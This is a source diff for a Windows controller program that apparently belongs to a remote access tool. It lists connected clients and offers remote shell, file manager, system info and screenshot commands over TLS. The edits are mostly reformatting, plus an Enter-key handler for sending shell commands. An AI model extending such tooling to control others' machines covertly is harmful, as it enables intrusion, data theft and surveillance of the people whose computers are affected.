@@ -78,8 +78,7 @@ static void Hello(Client* c, char* pl) {
   if (d) { *d = 0; strncpy(c->country, d + 1, sizeof(c->country) - 1); }
   if (b) { *b = 0; strncpy(c->user, a + 1, 255); strncpy(c->os, b + 1, 255); } else strcpy(c->os, "Windows");
   if (!c->country[0]) strcpy(c->country, "?");
-  LVITEMA it = {0}; it.mask = LVIF_TEXT | LVIF_PARAM; it.iItem = ListView_GetItemCount(g_list);
-  it.lParam = (LPARAM)c; it.pszText = c->host; ListView_InsertItem(g_list, &it);
+  LVITEMA it = {0}; it.mask = LVIF_TEXT | LVIF_PARAM; it.iItem = ListView_GetItemCount(g_list); it.lParam = (LPARAM)c; it.pszText = c->host; ListView_InsertItem(g_list, &it);
   RefreshRow(c);
 }
 static void FillFiles(Client* c, char* pl, uint32_t plLen) {
@@ -172,8 +171,7 @@ static DWORD WINAPI AcceptThread(LPVOID) {
 #define IDM_SHOT 203
 #define IDM_DROP 204
 static const struct { int id; const char* text; } kMenu[] = {
-  {IDM_SHELL, "Remote shell"}, {IDM_FILES, "File manager"}, {IDM_INFO, "System info"},
-  {IDM_SHOT, "Screenshot"}, {0, NULL}, {IDM_DROP, "Disconnect client"},
+  {IDM_SHELL, "Remote shell"}, {IDM_FILES, "File manager"}, {IDM_INFO, "System info"}, {IDM_SHOT, "Screenshot"}, {0, NULL}, {IDM_DROP, "Disconnect client"},
 };
 static HWND FocusChild(Client* c, int kind) {
   if (!c->wnd[kind]) return NULL; SetForegroundWindow(c->wnd[kind]); return c->wnd[kind];
@@ -193,12 +191,16 @@ static void ChildLayout(HWND h, int kind, int w, int ht) {
     MoveWindow(GetDlgItem(h, IDC_FGET), 4, ht - 28, 90, 24, TRUE); MoveWindow(GetDlgItem(h, 1), 0, 32, w, ht - 66, TRUE);
   } else if (kind == K_INFO) MoveWindow(GetDlgItem(h, 1), 0, 0, w, ht, TRUE);
 }
+static LRESULT CALLBACK ShellEditProc(HWND h, UINT m, WPARAM wp, LPARAM lp, UINT_PTR, DWORD_PTR) {
+  if (m == WM_KEYDOWN && wp == VK_RETURN) { SendMessageA(GetParent(h), WM_COMMAND, MAKEWPARAM(IDC_SHELLSEND, BN_CLICKED), 0); return 0; }
+  return DefSubclassProc(h, m, wp, lp);
+}
 static void ChildCommand(Client* c, int kind, HWND h, int id) {
   if (!c) return;
   if (kind == K_SHELL && id == IDC_SHELLSEND) {
     char buf[1024]; HWND in = GetDlgItem(h, IDC_SHELLIN);
     GetWindowTextA(in, buf, sizeof(buf) - 3); SetWindowTextA(in, ""); strcat(buf, "\r\n");
-    TlsSendMsg(&c->tls, C_SHELL_DATA, buf, strlen(buf));
+    TlsSendMsg(&c->tls, C_SHELL_DATA, buf, strlen(buf)); SetFocus(in);
   } else if (kind == K_FILES && id == IDC_FREFRESH) {
     char p[MAX_PATH]; GetWindowTextA(GetDlgItem(h, IDC_FPATH), p, sizeof(p));
     TlsSendMsg(&c->tls, C_FS_LIST, p, strlen(p));
@@ -247,7 +249,7 @@ static void OpenShell(Client* c) {
   char title[512]; sprintf(title, "Shell - %s", c->host);
   HWND h = c->wnd[K_SHELL] = MakeChild("OAShell", title, K_SHELL, c, 720, 500); if (!h) return;
   CreateWindowExA(WS_EX_CLIENTEDGE, "EDIT", "", WS_CHILD | WS_VISIBLE | ES_MULTILINE | ES_AUTOVSCROLL | WS_VSCROLL | ES_READONLY, 0, 0, 100, 100, h, (HMENU)1, g_inst, NULL);
-  CreateWindowExA(WS_EX_CLIENTEDGE, "EDIT", "", WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL, 0, 0, 100, 24, h, (HMENU)IDC_SHELLIN, g_inst, NULL); CreateWindowExA(0, "BUTTON", "Send", WS_CHILD | WS_VISIBLE, 0, 0, 78, 24, h, (HMENU)IDC_SHELLSEND, g_inst, NULL);
+  CreateWindowExA(WS_EX_CLIENTEDGE, "EDIT", "", WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL, 0, 0, 100, 24, h, (HMENU)IDC_SHELLIN, g_inst, NULL); SetWindowSubclass(GetDlgItem(h, IDC_SHELLIN), ShellEditProc, 0, 0); CreateWindowExA(0, "BUTTON", "Send", WS_CHILD | WS_VISIBLE, 0, 0, 78, 24, h, (HMENU)IDC_SHELLSEND, g_inst, NULL);
   Fit(h); TlsSendMsg(&c->tls, C_SHELL_START, NULL, 0);
 }
 static void OpenFiles(Client* c) {
@@ -268,8 +270,7 @@ static void OpenFiles(Client* c) {
 static void OpenInfo(Client* c) {
   if (!FocusChild(c, K_INFO)) {
     char title[512]; sprintf(title, "SysInfo - %s", c->host); HWND h = c->wnd[K_INFO] = MakeChild("OAInfo", title, K_INFO, c, 620, 620); if (!h) return;
-    CreateWindowExA(WS_EX_CLIENTEDGE, "EDIT", "requesting...", WS_CHILD | WS_VISIBLE | ES_MULTILINE | WS_VSCROLL | WS_HSCROLL | ES_AUTOVSCROLL | ES_AUTOHSCROLL | ES_READONLY, 0, 0, 100, 100, h, (HMENU)1, g_inst, NULL);
-    Fit(h);
+    CreateWindowExA(WS_EX_CLIENTEDGE, "EDIT", "requesting...", WS_CHILD | WS_VISIBLE | ES_MULTILINE | WS_VSCROLL | WS_HSCROLL | ES_AUTOVSCROLL | ES_AUTOHSCROLL | ES_READONLY, 0, 0, 100, 100, h, (HMENU)1, g_inst, NULL); Fit(h);
   }
   TlsSendMsg(&c->tls, C_SYSINFO, NULL, 0);
 }
@@ -349,8 +350,7 @@ int WINAPI WinMain(HINSTANCE inst, HINSTANCE, LPSTR, int) {
   g_list = CreateWindowExA(0, WC_LISTVIEWA, "", WS_CHILD | WS_VISIBLE | LVS_REPORT | LVS_SHOWSELALWAYS, 0, 36, 800, 300, g_main, (HMENU)IDC_LIST, inst, NULL);
   ListView_SetExtendedListViewStyle(g_list, LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);
   struct { const char* t; int cx; } cols[] = { {"Host", 160}, {"User", 140}, {"OS", 140}, {"Country", 140} };
-  LVCOLUMNA col = {0}; col.mask = LVCF_TEXT | LVCF_WIDTH;
-  for (int i = 0; i < 4; i++) { col.pszText = (LPSTR)cols[i].t; col.cx = cols[i].cx; ListView_InsertColumn(g_list, i, &col); }
+  LVCOLUMNA col = {0}; col.mask = LVCF_TEXT | LVCF_WIDTH; for (int i = 0; i < 4; i++) { col.pszText = (LPSTR)cols[i].t; col.cx = cols[i].cx; ListView_InsertColumn(g_list, i, &col); }
   g_status = CreateWindowExA(0, STATUSCLASSNAMEA, "idle", WS_CHILD | WS_VISIBLE, 0, 0, 800, 22, g_main, NULL, inst, NULL);
   RECT rc; GetClientRect(g_main, &rc); SendMessageA(g_main, WM_SIZE, 0, MAKELPARAM(rc.right, rc.bottom)); ShowWindow(g_main, SW_SHOW);
   MSG msg;
